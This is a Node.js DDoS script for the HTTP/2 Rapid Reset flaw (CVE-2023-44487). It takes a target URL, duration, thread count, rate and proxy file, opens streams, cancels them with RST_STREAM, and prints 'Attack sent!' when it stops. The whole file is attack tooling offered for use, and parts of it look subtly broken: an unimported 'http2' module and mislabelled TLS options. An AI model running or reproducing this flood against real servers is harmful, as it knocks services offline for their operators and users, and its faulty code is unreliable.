//HTTP2-RAPID CLIENT CVE-2023-44487

const https = require('https');
const http2wrapper = require('http2-wrapper');
const tls = require('tls');
const crypto = require('crypto');
const fs = require('fs');
const randomstring = require('randomstring');

const args = process.argv.slice(2);

if (args.length < 5) {
    console.log('Usage: node http2-rapid.js [url] [time] [threads] [rate] [proxyfile]');
    process.exit(1);
}

const targetUrl = args[0];
const time = parseInt(args[1], 10) || 0;
const threads = parseInt(args[2], 10) || 1;
const rate = parseInt(args[3], 10) || 1;
const proxyFile = args[4];

const concurrency = threads * rate;
let sentHeaders = 0;
let sentRSTs = 0;
let recvFrames = 0;

const startTime = new Date();

const parsedTarget = new URL(targetUrl);

const tlsOptions = {
    ALPNProtocols: ['h3', 'h2', 'http/1.1', 'h1', 'spdy/3.1', 'http/2+quic/43', 'http/2+quic/44', 'http/2+quic/45'],
    ecdhCurve: ["ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512", "ecdsa_brainpoolP384r1tls13_sha384", "ecdsa_brainpoolP512r1tls13_sha512", "ecdsa_sha1", "rsa_pss_pss_sha384", "GREASE:x25519:secp256r1:secp384r1", "GREASE:X25519:x25519", "GREASE:X25519:x25519:P-256:P-384:P-521:X448"],
    ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
    rejectUnauthorized: false,
};

const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

tlsConn.setKeepAlive(true, 60 * 10000);

const client = http2wrapper.connect(parsedTarget.href, {
    protocol: "https:",
    settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 20000,
        initialWindowSize: 6291456 * 10,
        maxHeaderListSize: 262144 * 10,
        enablePush: false,
    },
    maxSessionMemory: 64000,
    maxDeflateDynamicTableSize: 4294967295,
    createConnection: () => tlsConn,
});

client.settings({
    headerTableSize: 65536,
    maxConcurrentStreams: 1000,
    initialWindowSize: 6291456,
    maxHeaderListSize: 262144,
    enablePush: false,
});

function sendRequest(path, delay) {
    const headers = {
        ":method": "GET",
        ":path": path,
        ":scheme": "https",
        ":authority": targetUrl,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.5",
        "accept-encoding": "gzip, deflate, br",
        "Connection": Math.random() > 0.5 ? "keep-alive" : "close",
        "upgrade-insecure-requests": Math.random() > 0.5,
        "x-requested-with": "XMLHttpRequest",
        "pragma": Math.random() > 0.5 ? "no-cache" : "max-age=0",
        "cache-control": Math.random() > 0.5 ? "no-cache" : "max-age=0",
    };

    const stream = client.request(headers);

    stream.on('response', () => {
        sentHeaders++;
        
    });

    
    setTimeout(() => {
        stream.rstStream(http2.constants.NGHTTP2_CANCEL);
        sentRSTs++;
    }, delay);
}

function printSummary() {
    const endTime = new Date();
    const elapsedSeconds = (endTime - startTime) / 1000;

    console.log('\n--- Summary ---');
    console.log(`Frames sent: HEADERS = ${sentHeaders}, RST_STREAM = ${sentRSTs}`);
    console.log(`Frames received: ${recvFrames}`);
    console.log(`Total time: ${elapsedSeconds.toFixed(2)} seconds (${Math.round(sentHeaders / elapsedSeconds)} rps)\n`);
}

function makeRequest() {
    const path = parsedTarget.pathname || '/';
    const delay = Math.floor(Math.random() * 1000); 

    sendRequest(path, delay);
}
if (proxyFile) {
    const proxy = fs.readFileSync(proxyFile, 'utf8').trim();
    process.env.HTTPS_PROXY = proxy;
}
for (let i = 0; i < threads; i++) {
    for (let j = 0; j < rate; j++) {
        setTimeout(makeRequest, j * 1000 / rate);
    }
}
if (time > 0) {
    setTimeout(() => {
        client.close(() => {
            console.log('Attack sent!');
            process.exit(0);
        });
    }, time * 1000);
}
